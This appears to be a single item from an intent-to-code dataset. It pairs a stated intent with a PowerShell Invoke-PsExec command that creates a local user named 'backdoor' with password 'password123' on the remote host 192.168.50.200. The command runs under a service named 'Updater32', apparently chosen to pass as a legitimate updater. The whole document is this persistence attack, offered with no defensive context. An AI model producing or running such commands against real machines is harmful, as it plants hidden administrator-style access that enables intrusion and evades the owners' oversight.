# Natural language intent:
# Execute PsExec to add a user with specific credentials on a remote computer.

Invoke-PsExec -ComputerName 192.168.50.200 -Command 'net user backdoor password123 /add' -ServiceName Updater32
